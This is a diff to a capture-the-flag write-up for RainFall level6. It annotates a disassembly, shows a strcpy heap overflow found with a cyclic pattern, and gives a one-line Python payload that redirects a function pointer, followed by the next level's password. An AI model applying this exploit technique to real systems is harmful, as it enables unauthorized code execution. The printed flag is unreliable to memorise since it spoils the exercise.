@@ -75,10 +75,10 @@ Dump of assembler code for function main:
    0x0804847f <+3>:	and    esp,0xfffffff0
    0x08048482 <+6>:	sub    esp,0x20
    0x08048485 <+9>:	mov    DWORD PTR [esp],0x40
-   0x0804848c <+16>:	call   0x8048350 <malloc@plt>           <-- Function `malloc`
+   0x0804848c <+16>:	call   0x8048350 <malloc@plt>           <-- Function `malloc(64)`
    0x08048491 <+21>:	mov    DWORD PTR [esp+0x1c],eax
    0x08048495 <+25>:	mov    DWORD PTR [esp],0x4
-   0x0804849c <+32>:	call   0x8048350 <malloc@plt>           <-- Function `malloc` called for a second time
+   0x0804849c <+32>:	call   0x8048350 <malloc@plt>           <-- Function `malloc(4)` called for a second time
    0x080484a1 <+37>:	mov    DWORD PTR [esp+0x18],eax
    0x080484a5 <+41>:	mov    edx,0x8048468		        <-- Address of function m(), as seen in previous codeblock
    0x080484aa <+46>:	mov    eax,DWORD PTR [esp+0x18]
@@ -88,12 +88,12 @@ Dump of assembler code for function main:
    0x080484b6 <+58>:	mov    eax,DWORD PTR [eax]
    0x080484b8 <+60>:	mov    edx,eax
    0x080484ba <+62>:	mov    eax,DWORD PTR [esp+0x1c]
-   0x080484be <+66>:	mov    DWORD PTR [esp+0x4],edx
-   0x080484c2 <+70>:	mov    DWORD PTR [esp],eax
+   0x080484be <+66>:	mov    DWORD PTR [esp+0x4],edx          <-- argv[1]
+   0x080484c2 <+70>:	mov    DWORD PTR [esp],eax              <-- buffer argument allocated by malloc(64)  
    0x080484c5 <+73>:	call   0x8048340 <strcpy@plt>           <-- Function `strcpy`
    0x080484ca <+78>:	mov    eax,DWORD PTR [esp+0x18]
    0x080484ce <+82>:	mov    eax,DWORD PTR [eax]
-   0x080484d0 <+84>:	call   eax
+   0x080484d0 <+84>:	call   eax                              <-- Calling a function contained in eax
    0x080484d2 <+86>:	leave
    0x080484d3 <+87>:	ret
 End of assembler dump.
@@ -138,4 +138,54 @@ gdb-peda$ x/s 0x80485b0
 0x80485b0:	 "/bin/cat /home/user/level7/.pass"
 ```
 
-Which run our command to get the pass to level7.
+Which runs the command to get the pass to level7.
+
+## Vulnerability
+
+It's quite obvious when ready the man for `strcpy` that there is a blatant vulnerability with using it: the fact that it does not check for the size of the buffer and instead looks for a `\0` character in order to stop the copy.
+
+This allows us to inject a generated pattern from our favourite [website](https://wiremask.eu/tools/buffer-overflow-pattern-generator/?) in order to find the size of the buffer and continue with the exploit.
+
+By feeding the following pattern and checking the address at which the program crashed, the generatof can deduce the size of the buffer:
+
+```gdb
+Invalid $PC address: 0x41346341
+[------------------------------------stack-------------------------------------]
+0000| 0xbffffb5c --> 0x80484d2 (<main+86>:	leave)
+0004| 0xbffffb60 --> 0x804a008 ("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag")
+0008| 0xbffffb64 --> 0xbffffd5b ("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag")
+0012| 0xbffffb68 --> 0xb7fd0ff4 --> 0x1a4d7c
+0016| 0xbffffb6c --> 0xb7e5ee55 (<__cxa_atexit+53>:	add    esp,0x18)
+0020| 0xbffffb70 --> 0xb7fed280 (push   ebp)
+0024| 0xbffffb74 --> 0x0
+0028| 0xbffffb78 --> 0x804a050 ("Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag")
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x41346341 in ?? ()
+```
+
+![](Ressources/pattern_gen.png)
+
+We now have the size of the buffer: `72` !
+
+All we have left to do, is overwrite the address of `m()` with the address of `n()` in the function pointer called at the end of the main function.
+
+Just as a refresher, the functions' addresses:
+
+```gdb
+[...]
+0x08048454  n                          <-- Function `n` address
+0x08048468  m                          <-- Function `m` address
+0x0804847c  main                       <-- Function `main` address
+[...]
+```
+
+As always, we should keep in mind the endianess of the machine and write the address of `n()` in reverse so stick with the execution flow of the program.
+
+# Exploit
+
+```shell-session
+level6@RainFall:~$ ./level6 $(python -c 'print "B"*72 + "\x54\x84\x04\x08"')
+f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
+```
